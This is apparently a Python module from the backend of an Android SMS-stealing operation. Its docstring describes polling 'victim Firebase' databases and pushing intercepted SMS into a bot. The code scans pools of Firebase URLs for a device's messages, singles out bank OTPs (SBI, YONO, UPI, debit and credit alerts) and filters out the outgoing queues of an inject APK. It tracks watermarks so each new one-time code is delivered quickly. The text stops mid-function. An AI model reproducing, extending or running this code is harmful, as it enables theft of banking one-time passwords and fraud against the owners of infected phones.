"""Poll victim Firebase for new SMS and push into bot (Astik-style)."""

from __future__ import annotations

import asyncio
import json
import logging
import re
from datetime import datetime, timezone
from typing import Any

import httpx

from app.config import get_settings
from app.database import Device, MonitorProfile, SessionLocal
from app.firebase_client import _fetch_json, firebase_root_url, get_poll_workers
from app.services import get_active_device, get_monitor_profile, save_sms

logger = logging.getLogger(__name__)

POLL_INTERVAL_SEC = 0.4
POLL_FETCH_TIMEOUT_SEC = 1.2
SNAPSHOT_TIMEOUT_SEC = 5.0


def _otp_poll_interval() -> float:
    return max(0.08, get_settings().otp_poll_interval_sec)


def _otp_poll_timeout() -> float:
    return max(0.30, get_settings().otp_poll_timeout_sec)

MONITORING_START_SNAPSHOT_SEC = 4.0
MAX_POLL_PATHS_FALLBACK = 8
def _poll_profile_concurrency() -> int:
    return max(16, min(48, get_poll_workers()))
HOT_POLL_MAX_PATHS = 4
SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
SMS_CHILD_PATHS = (
    "sms",
    "messages",
    "smsList",
    "inbox",
    "sms_inbox",
    "Sms",
    "SMS",
    "msg",
    "log",
    "logs",
    "history",
)
SENDER_FIELDS = (
    "sender",
    "from",
    "address",
    "phone",
    "number",
    "fromNumber",
    "from_number",
    "fromAddress",
    "senderId",
    "sender_id",
)
BODY_FIELDS = (
    "message",
    "body",
    "text",
    "content",
    "msg",
    "sms",
    "smsBody",
    "smsText",
    "sms_text",
    "messageBody",
    "msgText",
    "msgBody",
    "smsMessage",
    "otp",
    "code",
)
SINGLETON_SMS_SUFFIXES = (
    "/lastSms",
    "/last_sms",
    "/latest_sms",
    "/otp",
    "/lastMessage",
    "/webhookEvent/receiveSms",
    "/webhookEvent/incomingSms",
    "/webhookEvent/newSms",
    "/webhookEvent/smsIn",
)
TIME_FIELDS = (
    "time",
    "date",
    "dateTime",
    "timestamp",
    "ts",
    "received_at",
    "created_at",
    "createdAt",
    "smsTime",
    "receivedDate",
    "createdDate",
)
RECENT_MESSAGES_LIMIT = 40
MAX_OTP_DELIVER_PER_POLL = 40
_MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
SEEN_META_KEY = "firebase_sms_seen"
INJECT_DONE_META_KEY = "firebase_sms_inject_done"
BASELINE_META_KEY = "firebase_sms_baseline"
BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY = "firebase_sms_baseline_shallow_done"
BASELINE_POLL_TAIL_LOCK_META_KEY = "firebase_sms_baseline_poll_lock"
MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
OTP_EMPTY_POLL_STREAK_META_KEY = "otp_empty_poll_streak"
EMPTY_POLL_RESCAN_AFTER = 3
SMS_PATHS_META_KEY = "firebase_sms_paths"
MAX_SEEN_KEYS = 20000
MAX_CACHED_SMS_PATHS = 50
BODY_DATE_RE = re.compile(
    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s*(?:\||-)\s*\d{1,2}:\d{2}\s*(?:am|pm)?|\s+\d{1,2}:\d{2})?\b",
    re.I,
)
OUTGOING_QUEUE_BODY_RE = re.compile(r"^\d{10,15}\n.+\n\d+$", re.S)
OUTGOING_LOG_MARKERS = (
    "intercepted outgoing",
    "zygisk",
    "outgoing sms",
)


def _device_ids(device: Device) -> list[str]:
    ids: list[str] = []
    if device.name:
        ids.append(device.name.strip())
    if device.firebase_key:
        leaf = device.firebase_key.strip("/").split("/")[-1]
        if leaf and leaf not in ids:
            ids.append(leaf)
    return ids


def _firebase_url_candidates(profile: MonitorProfile, device: Device) -> list[str]:
    from app.firebase_client import normalize_firebase_url
    from app.firebase_sync import get_profile_firebase_url, resolve_firebase_url

    ordered: list[str] = []
    meta = _meta_dict(device)
    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
    if isinstance(cached, str) and cached.strip():
        ordered.append(normalize_firebase_url(cached))
    if device.firebase_source_url:
        ordered.append(normalize_firebase_url(device.firebase_source_url))
    primary = resolve_firebase_url(profile, device)
    if primary:
        ordered.append(normalize_firebase_url(primary))
    profile_url = get_profile_firebase_url(profile)
    if profile_url:
        ordered.append(normalize_firebase_url(profile_url))
    seen: set[str] = set()
    out: list[str] = []
    for url in ordered:
        if url and url not in seen:
            seen.add(url)
            out.append(url)
    return out


async def _messages_path_exists(
    firebase_url: str,
    device_id: str,
    *,
    timeout: float,
) -> bool:
    root = firebase_root_url(firebase_url)
    url = f"{root}/messages/{device_id}.json?limitToLast=1"
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError:
        return False
    return isinstance(data, dict) and bool(data)


async def _scan_pool_for_device_messages(
    db,
    device_id: str,
    *,
    skip: set[str] | None = None,
) -> str | None:
    """One-shot: find which pool Firebase holds messages/{device_id}."""
    from app.services import get_all_firebase_urls

    pool = [url for url in get_all_firebase_urls(db) if url and url not in (skip or set())]
    if not pool:
        return None

    timeout = min(_otp_poll_timeout(), 0.65)
    semaphore = asyncio.Semaphore(32)
    stop = asyncio.Event()
    found: str | None = None
    lock = asyncio.Lock()

    async def probe(url: str) -> None:
        nonlocal found
        if stop.is_set():
            return
        async with semaphore:
            if stop.is_set():
                return
            if await _messages_path_exists(url, device_id, timeout=timeout):
                async with lock:
                    if not found:
                        found = url
                        stop.set()

    await asyncio.gather(*(probe(url) for url in pool), return_exceptions=True)
    if found:
        logger.info(
            "OTP pool scan hit device=%s url=%s (scanned %s pool DBs)",
            device_id,
            found,
            len(pool),
        )
    return found


async def resolve_firebase_url_for_otp_poll(
    profile: MonitorProfile,
    device: Device,
    db,
    *,
    force_pool_scan: bool = False,
) -> str | None:
    """Pick the Firebase DB that actually has messages/{device} (pool vs /setfirebase)."""
    from app.firebase_client import normalize_firebase_url

    device_id = (device.name or "").strip()
    if not device_id:
        return None

    timeout = _otp_poll_timeout()
    candidates = _firebase_url_candidates(profile, device)
    meta = _meta_dict(device)

    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
    if isinstance(cached, str) and cached.strip() and not force_pool_scan:
        if await _messages_path_exists(cached, device_id, timeout=timeout):
            return normalize_firebase_url(cached)
        meta.pop(SMS_FIREBASE_URL_META_KEY, None)

    for url in candidates:
        if await _messages_path_exists(url, device_id, timeout=timeout):
            if normalize_firebase_url(device.firebase_source_url or "") != url:
                device.firebase_source_url = url
            meta[SMS_FIREBASE_URL_META_KEY] = url
            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
            _save_meta(device, meta)
            db.commit()
            logger.info("OTP poll DB resolved device=%s url=%s", device_id, url)
            return url

    if force_pool_scan:
        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)

    if not meta.get(POOL_SMS_SCAN_DONE_META_KEY) or force_pool_scan:
        pool_hit = await _scan_pool_for_device_messages(
            db,
            device_id,
            skip=set(candidates),
        )
        meta[POOL_SMS_SCAN_DONE_META_KEY] = True
        if pool_hit:
            device.firebase_source_url = pool_hit
            meta[SMS_FIREBASE_URL_META_KEY] = pool_hit
            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
            _save_meta(device, meta)
            db.commit()
            return pool_hit
        _save_meta(device, meta)
        db.commit()

    logger.warning(
        "OTP poll: no messages path for %s (candidates=%s)",
        device_id,
        len(candidates),
    )
    return None


def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
    from app.firebase_client import normalize_firebase_url

    meta = _meta_dict(device)
    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
    if isinstance(cached, str) and cached.strip():
        return normalize_firebase_url(cached)
    candidates = _firebase_url_candidates(profile, device)
    return candidates[0] if candidates else None


def _meta_dict(device: Device) -> dict[str, Any]:
    if not device.device_meta:
        return {}
    try:
        data = json.loads(device.device_meta)
        return data if isinstance(data, dict) else {}
    except (json.JSONDecodeError, TypeError):
        return {}


def _save_meta(device: Device, meta: dict[str, Any]) -> None:
    from sqlalchemy.orm.attributes import flag_modified

    device.device_meta = json.dumps(meta)
    flag_modified(device, "device_meta")


def get_seen_sms_keys(device: Device) -> set[str]:
    meta = _meta_dict(device)
    seen = meta.get(SEEN_META_KEY) or []
    if isinstance(seen, list):
        return {str(item) for item in seen}
    return set()


def get_inject_done_keys(device: Device) -> set[str]:
    meta = _meta_dict(device)
    done = meta.get(INJECT_DONE_META_KEY) or []
    if isinstance(done, list):
        return {str(item) for item in done}
    return set()


def mark_inject_done_keys(device: Device, keys: set[str]) -> None:
    if not keys:
        return
    meta = _meta_dict(device)
    done = list(get_inject_done_keys(device) | keys)
    if len(done) > MAX_SEEN_KEYS:
        done = done[-MAX_SEEN_KEYS:]
    meta[INJECT_DONE_META_KEY] = done
    _save_meta(device, meta)


def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
    if not keys:
        return
    meta = _meta_dict(device)
    seen = list(get_seen_sms_keys(device) | keys)
    if len(seen) > MAX_SEEN_KEYS:
        seen = seen[-MAX_SEEN_KEYS:]
    meta[SEEN_META_KEY] = seen
    _save_meta(device, meta)


def _baseline_shallow_snapshot_done(device: Device, profile: MonitorProfile) -> bool:
    started = _started_iso(profile.started_at)
    if not started:
        return False
    meta = _meta_dict(device)
    return meta.get(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY) == started


def get_baseline_sms_keys(device: Device) -> set[str]:
    meta = _meta_dict(device)
    baseline = meta.get(BASELINE_META_KEY) or []
    if isinstance(baseline, list):
        return {str(item) for item in baseline}
    return set()


def _set_baseline_sms_keys(device: Device, keys: set[str], started_at: datetime | None) -> None:
    meta = _meta_dict(device)
    meta[BASELINE_META_KEY] = list(keys)
    meta[SEEN_META_KEY] = list(keys)
    if started_at:
        meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
    _save_meta(device, meta)


def _started_iso(started_at: datetime | None) -> str | None:
    if not started_at:
        return None
    if started_at.tzinfo is None:
        started_at = started_at.replace(tzinfo=timezone.utc)
    return started_at.replace(microsecond=0).isoformat()


def baseline_ready(device: Device, profile: MonitorProfile) -> bool:
    started = _started_iso(profile.started_at)
    if not started:
        return False
    meta = _meta_dict(device)
    return meta.get(BASELINE_AT_META_KEY) == started


def clear_sms_baseline(device: Device) -> None:
    meta = _meta_dict(device)
    meta.pop(BASELINE_META_KEY, None)
    meta.pop(BASELINE_AT_META_KEY, None)
    meta.pop(BASELINE_READY_META_KEY, None)
    meta.pop(SEEN_META_KEY, None)
    meta.pop(MESSAGES_HIGH_WATER_META, None)
    meta.pop(INJECT_DONE_META_KEY, None)
    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
    meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
    meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
    meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
    _save_meta(device, meta)


def _bump_empty_poll_streak(device: Device, db) -> int:
    meta = _meta_dict(device)
    streak = int(meta.get(OTP_EMPTY_POLL_STREAK_META_KEY) or 0) + 1
    meta[OTP_EMPTY_POLL_STREAK_META_KEY] = streak
    _save_meta(device, meta)
    db.commit()
    return streak


def _reset_empty_poll_streak(device: Device, db) -> None:
    meta = _meta_dict(device)
    if meta.get(OTP_EMPTY_POLL_STREAK_META_KEY):
        meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
        _save_meta(device, meta)
        db.commit()


def _leaf_push_int(firebase_key: str) -> int | None:
    leaf = firebase_key.rsplit("/", 1)[-1]
    try:
        return int(leaf)
    except ValueError:
        return None


def _old_message_keys_for_baseline(shallow: set[str], high_water: int) -> set[str]:
    """Only pre-monitoring keys — never mark new Firebase SMS as seen."""
    old: set[str] = set()
    for key in shallow:
        push = _leaf_push_int(key)
        if push is not None:
            # Strictly below tail — marking the tail id would skip a brand-new OTP
            # when baseline runs on an empty or slow device.
            if push < high_water:
                old.add(key)
        else:
            old.add(key)
    return old


def _monitoring_baseline_done(device: Device, profile: MonitorProfile) -> bool:
    started = _started_iso(profile.started_at)
    if not started:
        return False
    meta = _meta_dict(device)
    return (
        meta.get(BASELINE_AT_META_KEY) == started
        and meta.get(BASELINE_READY_META_KEY) is True
    )


def _message_leaf_key(record: dict[str, Any]) -> str | None:
    firebase_key = str(record.get("firebase_key") or "")
    if not firebase_key.startswith("messages/"):
        return None
    leaf = firebase_key.rsplit("/", 1)[-1]
    return leaf or None


def _message_push_id(record: dict[str, Any]) -> int | None:
    raw_id = record.get("push_id")
    if raw_id is not None:
        try:
            return int(raw_id)
        except (TypeError, ValueError):
            pass
    leaf = _message_leaf_key(record)
    if not leaf:
        return None
    try:
        return int(leaf)
    except ValueError:
        return None


def _monitoring_start_utc(profile: MonitorProfile) -> datetime | None:
    started = profile.started_at
    if not started:
        return None
    if started.tzinfo is None:
        return started.replace(tzinfo=timezone.utc)
    return started.astimezone(timezone.utc)


def _record_is_after_monitoring_start(
    record: dict[str, Any],
    profile: MonitorProfile,
) -> bool:
    started = _monitoring_start_utc(profile)
    if not started:
        return True
    received = record.get("received_at")
    if not isinstance(received, datetime):
        return False
    if received.tzinfo is None:
        received = received.replace(tzinfo=timezone.utc)
    return received >= started


def _messages_high_water(device: Device) -> int:
    meta = _meta_dict(device)
    raw = meta.get(MESSAGES_HIGH_WATER_META)
    try:
        return int(raw or 0)
    except (TypeError, ValueError):
        return 0


def _is_new_after_high_water(record: dict[str, Any], device: Device) -> bool:
    push_id = _message_push_id(record)
    if push_id is None:
        return False
    return push_id > _messages_high_water(device)


def _record_is_new(record: dict[str, Any], device: Device) -> bool:
    push_id = _message_push_id(record)
    if push_id is not None:
        return push_id > _messages_high_water(device)
    dedup_key = _record_dedup_key(record)
    seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
    return dedup_key not in seen


def _set_baseline_high_water(
    device: Device,
    high_water: int,
    started_at: datetime | None,
) -> None:
    meta = _meta_dict(device)
    meta[MESSAGES_HIGH_WATER_META] = int(high_water)
    meta[BASELINE_META_KEY] = []
    if started_at:
        meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
    meta[BASELINE_READY_META_KEY] = True
    _save_meta(device, meta)


def _bump_messages_high_water(device: Device, push_id: int) -> None:
    if push_id <= _messages_high_water(device):
        return
    meta = _meta_dict(device)
    meta[MESSAGES_HIGH_WATER_META] = push_id
    _save_meta(device, meta)


def _should_deliver_otp_record(
    record: dict[str, Any],
    device: Device,
    profile: MonitorProfile,
) -> bool:
    """After baseline: any unseen message in tail (old SMS already marked seen at start)."""
    if not _monitoring_baseline_done(device, profile):
        return False
    return _record_dedup_key(record) not in get_seen_sms_keys(device)


def _looks_like_incoming_sms(sender: str, body: str) -> bool:
    """Never treat bank / YONO / OTP traffic as poll noise."""
    sender_u = (sender or "").strip().upper()
    body_l = (body or "").lower()
    if sender_u and sender_u not in {"UNKNOWN", "__OUT__", "0", "1", "2"} and "-" in sender_u:
        return True
    if re.search(r"\b\d{4,8}\b", body or ""):
        return True
    markers = (
        "otp",
        "yono",
        "sbi",
        "upi",
        "registration",
        "debited",
        "credited",
        "txn",
        "balance",
        "account",
        "dontshare",
    )
    return any(marker in body_l for marker in markers) or len((body or "").strip()) > 48


def _parse_body_date(text: str) -> datetime | None:
    raw = (text or "").strip()
    comma_match = re.search(
        r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})\s*,\s*(\d{1,2}):(\d{2})\s*(am|pm)?\b",
        raw,
        re.I,
    )
    if comma_match:
        day, month, year = (
            int(comma_match.group(1)),
            int(comma_match.group(2)),
            int(comma_match.group(3)),
        )
        if year < 100:
            year += 2000
        hour, minute = int(comma_match.group(4)), int(comma_match.group(5))
        ampm = (comma_match.group(6) or "").lower()
        if ampm == "pm" and hour < 12:
            hour += 12
        if ampm == "am" and hour == 12:
            hour = 0
        try:
            return datetime(year, month, day, hour, minute, tzinfo=timezone.utc)
        except ValueError:
            return None

    panel_match = re.search(
        r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})\s*(?:\||-)\s*(\d{1,2}):(\d{2})\s*(am|pm)?\b",
        raw,
        re.I,
    )
    if panel_match:
        day, month, year = (
            int(panel_match.group(1)),
            int(panel_match.group(2)),
            int(panel_match.group(3)),
        )
        if year < 100:
            year += 2000
        hour, minute = int(panel_match.group(4)), int(panel_match.group(5))
        ampm = (panel_match.group(6) or "").lower()
        if ampm == "pm" and hour < 12:
            hour += 12
        if ampm == "am" and hour == 12:
            hour = 0
        try:
            return datetime(year, month, day, hour, minute, tzinfo=timezone.utc)
        except ValueError:
            return None

    match = BODY_DATE_RE.search(raw)
    if not match:
        return None
    day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
    if year < 100:
        year += 2000
    try:
        return datetime(year, month, day, tzinfo=timezone.utc)
    except ValueError:
        return None


def _is_singleton_sms_path(firebase_key: str) -> bool:
    key = (firebase_key or "").rstrip("/")
    return any(key.endswith(suffix) for suffix in SINGLETON_SMS_SUFFIXES)


def _record_dedup_key(record: dict[str, Any]) -> str:
    """lastSms/otp nodes reuse the same key — dedupe by sender+body."""
    firebase_key = str(record.get("firebase_key") or "")
    if _is_singleton_sms_path(firebase_key):
        sender = str(record.get("sender") or "")
        message = str(record.get("message") or "")
        return f"{firebase_key}|{sender}|{message}"
    return firebase_key


def _is_sms_list_path(firebase_key: str) -> bool:
    """Push-id SMS under sms/SMS/bank/messages — use seen-set, not timestamp."""
    key = (firebase_key or "").lower()
    if key.startswith("messages/"):
        return True
    return any(
        token in key
        for token in (
            "/sms/",
            "/smslist/",
            "/messages/",
            "/inbox/",
            "/bank/",
            "/banksms/",
        )
    )


def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
    """Skip Firebase backlog — only SMS at/after monitoring start."""
    firebase_key = str(record.get("firebase_key") or "")
    if _is_singleton_sms_path(firebase_key):
        return False
    if _is_sms_list_path(firebase_key):
        return False

    started = profile.started_at
    if not started:
        return False

    if started.tzinfo is None:
        started = started.replace(tzinfo=timezone.utc)

    received_at = record.get("received_at")
    if received_at:
        if received_at.tzinfo is None:
            received_at = received_at.replace(tzinfo=timezone.utc)
        return received_at < started

    body_date = _parse_body_date(record.get("message", ""))
    if body_date:
        return body_date < started

    # New Firebase key without timestamp — treat as live SMS after monitoring start.
    return False


def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
    sender_l = (sender or "").lower()
    body_l = (body or "").lower()
    if any(marker in sender_l for marker in OUTGOING_LOG_MARKERS):
        return True
    if any(marker in body_l for marker in OUTGOING_LOG_MARKERS):
        return True
    return False


def _first_field(data: dict, names: tuple[str, ...]) -> str | None:
    for name in names:
        value = data.get(name)
        if value is None:
            continue
        text = str(value).strip()
        if text and text.lower() not in {"null", "none", "n/a"}:
            return text
    return None


def _parse_timestamp(raw: Any) -> datetime | None:
    if raw is None:
        return None
    if isinstance(raw, (int, float)):
        ts = float(raw)
        if ts > 1_000_000_000_000:
            ts /= 1000.0
        try:
            return datetime.fromtimestamp(ts, tz=timezone.utc)
        except (OSError, OverflowError, ValueError):
            return None
    text = str(raw).strip()
    if not text:
        return None
    if text.isdigit():
        return _parse_timestamp(int(text))
    parsed = _parse_body_date(text)
    if parsed and ("|" in text or re.search(r"\d{1,2}:\d{2}", text)):
        return parsed
    try:
        normalized = text.replace("Z", "+00:00")
        return datetime.fromisoformat(normalized).astimezone(timezone.utc)
    except ValueError:
        return _parse_body_date(text)


def _is_inject_queue_entry(value: dict[str, Any]) -> bool:
    """Skip Virtus APK inject/outgoing queue nodes under messages/{id}/."""
    if "injected" in value:
        return True
    sender = _first_field(value, SENDER_FIELDS) or ""
    if sender == "__OUT__":
        return True
    body = _first_field(value, BODY_FIELDS) or ""
    if OUTGOING_QUEUE_BODY_RE.match(body.strip()):
        return True
    return False


def _is_channel_outgoing_webhook(value: dict[str, Any]) -> bool:
    """Skip tgtoken/webhookEvent/sendSms outbound (channel auto-token)."""
    if "isSended" in value:
        return True
    to_val = str(value.get("to") or "").strip()
    from_val = str(value.get("from") or "").strip()
    if not to_val or len(re.sub(r"\D", "", to_val)) < 10:
        return False
    # Outbound channel uses SIM slot 0/1/2 in "from". Real senders (AD-ZEPTON-S) are incoming OTP.
    if from_val in {"0", "1", "2"}:
        return True
    return False


POLL_NOISE_BODIES = frozenset(
    {
        "pong",
        "ping",
        "hyy",
        "hi",
        "ok",
        "test",
        "hello",
        "null",
        "undefined",
    }
)


def _is_poll_noise_record(sender: str, message: str) -> bool:
    from app.device_ui import STARTUP_TEST_MESSAGE

    sender_l = (sender or "").strip().lower()
    body = (message or "").strip()
    body_l = body.lower()

    if sender_l in {"__out__", "unknown"} and OUTGOING_QUEUE_BODY_RE.match(body):
        return True
    if sender_l == "__out__":
        return True
    if body_l in POLL_NOISE_BODIES:
        return True
    if body_l == STARTUP_TEST_MESSAGE.lower():
        return True
    if sender_l in {"astik", "baby"} and body_l == STARTUP_TEST_MESSAGE.lower():
        return True
    if "astik test ok" in body_l and "module alive" in body_l:
        return True
    if sender_l == "unknown" and len(body) <= 3 and not re.search(r"\d", body):
        return True
    return False


def _parse_panel_sms_string(text: str) -> tuple[str, str]:
    """Chrome panel sometimes stores SMS as 'SENDER | date | body'."""
    raw = (text or "").strip()
    if not raw:
        return "Unknown", raw
    parts = [part.strip() for part in raw.split("|")]
    if len(parts) >= 3 and re.match(r"^[A-Z0-9-]{3,}$", parts[0], re.I):
        sender = parts[0]
        body = "|".join(parts[2:]).strip() if len(parts) > 2 else parts[-1]
        return sender, body or raw
    return "Unknown", raw


def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
    if not isinstance(value, dict):
        return None

    if _is_inject_queue_entry(value):
        return None
    if _is_channel_outgoing_webhook(value):
        return None
    msg_type = str(value.get("type") or "").strip().lower()
    if msg_type == "outgoing":
        return None

    sender = _first_field(value, SENDER_FIELDS)
    if sender in {"0", "1", "2"} and value.get("to"):
        return None
    body = _first_field(value, BODY_FIELDS)

    nested = value.get("lastSms") or value.get("last_sms") or value.get("sms")
    if isinstance(nested, dict):
        sender = sender or _first_field(nested, SENDER_FIELDS)
        body = body or _first_field(nested, BODY_FIELDS)

    if not body:
        for field in ("otp", "code", "data"):
            raw = value.get(field)
            if raw is not None and str(raw).strip():
                body = str(raw).strip()
                break
        if isinstance(nested, dict) and not body:
            for field in ("otp", "code", "data"):
                raw = nested.get(field)
                if raw is not None and str(raw).strip():
                    body = str(raw).strip()
                    break

    if not body:
        return None
    if not sender:
        sender = "Unknown"

    push_id_val: int | None = None
    if value.get("id") is not None:
        try:
            push_id_val = int(value.get("id"))
        except (TypeError, ValueError):
            push_id_val = None

    received_at = None
    if value.get("dateTime"):
        received_at = _parse_timestamp(value.get("dateTime"))
    for field in TIME_FIELDS:
        if field in value:
            received_at = _parse_timestamp(value.get(field))
            if received_at:
                break
        if isinstance(nested, dict) and field in nested:
            received_at = _parse_timestamp(nested.get(field))
            if received_at:
                break

    out: dict[str, Any] = {
        "firebase_key": firebase_key,
        "sender": sender,
        "message": body,
        "received_at": received_at,
    }
    if push_id_val is not None:
        out["push_id"] = push_id_val
    return out


_SKIP_SMS_NODE_KEYS = frozenset(
    {
        "config",
        "meta",
        "device",
        "sim",
        "battery",
        "online",
        "last_seen",
        "model",
        "name",
        "phone",
        "phone_number",
        "mobile",
        "carrier",
        "carrier1",
        "carrier2",
        "sim1",
        "sim2",
        "phone2",
        "status",
        "monitoring",
        "commands",
        "outgoing",
    }
)


def _extract_sms_records(path: str, value: Any) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    if isinstance(value, list):
        for index, item in enumerate(value):
            if isinstance(item, dict):
                parsed = _parse_sms_entry(f"{path}/{index}", item)
                if parsed:
                    records.append(parsed)
        return records

    if isinstance(value, str):
        text = value.strip()
        if text and not _is_poll_noise_record("Unknown", text):
            records.append(
                {
                    "firebase_key": path,
                    "sender": "Unknown",
                    "message": text,
                    "received_at": None,
                }
            )
        return records

    if not isinstance(value, dict):
        return records

    direct = _parse_sms_entry(path, value)
    if direct:
        records.append(direct)

    for child_key, child_val in value.items():
        if child_key.startswith("num-"):
            continue
        if child_key in _SKIP_SMS_NODE_KEYS:
            continue
        child_path = f"{path}/{child_key}"
        if isinstance(child_val, dict):
            nested = child_val.get("lastSms") or child_val.get("last_sms") or child_val.get("sms")
            if isinstance(nested, dict):
                parsed = _parse_sms_entry(f"{child_path}/lastSms", nested)
                if parsed:
                    records.append(parsed)
            records.extend(_extract_sms_records(child_path, child_val))
        elif isinstance(child_val, list):
            records.extend(_extract_sms_records(child_path, child_val))
        elif isinstance(child_val, str):
            if child_key in SENDER_FIELDS or child_key in BODY_FIELDS or child_key in TIME_FIELDS:
                continue
            if _first_field(value, SENDER_FIELDS) and _first_field(value, BODY_FIELDS):
                continue
            text = child_val.strip()
            if text and not _is_poll_noise_record("Unknown", text):
                sender, body = _parse_panel_sms_string(text)
                records.append(
                    {
                        "firebase_key": child_path,
                        "sender": sender,
                        "message": body,
                        "received_at": _parse_body_date(text) or _parse_body_date(body),
                    }
                )
    return records


def _is_incoming_firebase_message(value: Any) -> bool:
    if not isinstance(value, dict):
        return False
    if _is_inject_queue_entry(value) or _is_channel_outgoing_webhook(value):
        return False
    if str(value.get("type") or "").strip().lower() == "outgoing":
        return False
    sender = _first_field(value, SENDER_FIELDS) or ""
    if sender == "__OUT__":
        return False
    return bool(_first_field(value, BODY_FIELDS))


async def _fetch_messages_high_water(root: str, device_id: str, timeout: float) -> int:
    """Max incoming SMS key in tail — ignore __OUT__/inject nodes (bad watermark)."""
    url = (
        f"{root}/messages/{device_id}.json"
        f'?orderBy=%22%24key%22&limitToLast={RECENT_MESSAGES_LIMIT}'
    )
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError:
        return 0
    if not isinstance(data, dict) or not data:
        return 0
    ids: list[int] = []
    for key, value in data.items():
        if not _is_incoming_firebase_message(value):
            continue
        try:
            ids.append(int(key))
        except ValueError:
            continue
    return max(ids) if ids else 0


def _incoming_push_ids(records: list[dict[str, Any]]) -> list[int]:
    """Push IDs for real SMS only — never __OUT__/inject queue keys."""
    ids: list[int] = []
    for record in records:
        sender = str(record.get("sender") or "")
        body = str(record.get("message") or "")
        if sender.strip().upper() == "__OUT__" or _is_poll_noise_record(sender, body):
            continue
        if _is_outgoing_firebase_log(sender, body):
            continue
        pid = _message_push_id(record)
        if pid is not None:
            ids.append(pid)
    return ids


async def _reconcile_incoming_high_water(
    device: Device,
    root: str,
    device_id: str,
    db,
    timeout: float,
) -> int:
    """Fix poisoned watermark from old __OUT__/inject tail keys (e.g. 2026… vs 1794… OTP)."""
    stored = _messages_high_water(device)
    if stored <= 0:
        return stored
    incoming = await _fetch_messages_high_water(root, device_id, timeout)
    if incoming > 0 and stored > incoming:
        logger.warning(
            "OTP high_water clamp device=%s stored=%s incoming=%s",
            device_id,
            stored,
            incoming,
        )
        meta = _meta_dict(device)
        meta[MESSAGES_HIGH_WATER_META] = incoming
        _save_meta(device, meta)
        db.commit()
        return incoming
    return stored


async def _fetch_outgoing_message_keys(
    root: str, device_id: str, timeout: float,
) -> set[str]:
    """Mark inject/out queue keys seen so they never block real OTP delivery."""
    url = (
        f"{root}/messages/{device_id}.json"
        f'?orderBy=%22%24key%22&limitToLast={RECENT_MESSAGES_LIMIT}'
    )
    prefix = f"messages/{device_id}"
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError:
        return set()
    if not isinstance(data, dict):
        return set()
    junk: set[str] = set()
    for key, value in data.items():
        if _is_incoming_firebase_message(value):
            continue
        junk.add(f"{prefix}/{key}")
    return junk


async def _fetch_messages_shallow_keys(root: str, device_id: str, timeout: float) -> set[str]:
    """All message push-ids — lightweight baseline for Chrome panel messages/{id}."""
    url = f"{root}/messages/{device_id}.json?shallow=true"
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError:
        return set()
    if not isinstance(data, dict):
        return set()
    prefix = f"messages/{device_id}"
    return {f"{prefix}/{key}" for key in data.keys()}


async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict[str, Any]]:
    if _MESSAGES_DEVICE_PATH_RE.match(path):
        url = (
            f"{root}/{path}.json"
            f'?orderBy=%22%24key%22&limitToLast={RECENT_MESSAGES_LIMIT}'
        )
        logger.debug("Firebase OTP poll GET %s (last %s)", path, RECENT_MESSAGES_LIMIT)
    else:
        url = f"{root}/{path}.json"
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError as exc:
        if _MESSAGES_DEVICE_PATH_RE.match(path):
            logger.warning("Firebase OTP poll failed %s: %s", path, exc)
        return []

    records = _extract_sms_records(path, data)
    if _MESSAGES_DEVICE_PATH_RE.match(path) and records:
        logger.debug("Firebase OTP poll %s -> %s SMS parsed", path, len(records))
    return records


def _generate_sms_paths(device: Device) -> list[str]:
    paths: list[str] = []
    seen_paths: set[str] = set()

    if device.firebase_key:
        fk = device.firebase_key.strip("/")
        if fk:
            seen_paths.add(fk)
            paths.append(fk)
            for child in SMS_CHILD_PATHS:
                child_path = f"{fk}/{child}"
                if child_path not in seen_paths:
                    seen_paths.add(child_path)
                    paths.append(child_path)
            if "/" in fk:
                parent, leaf = fk.rsplit("/", 1)
                for child in SMS_CHILD_PATHS:
                    child_path = f"{parent}/{leaf}/{child}"
                    if child_path not in seen_paths:
                        seen_paths.add(child_path)
                        paths.append(child_path)

    for device_id in _device_ids(device):
        for parent in SMS_PARENT_PATHS:
            for child in SMS_CHILD_PATHS:
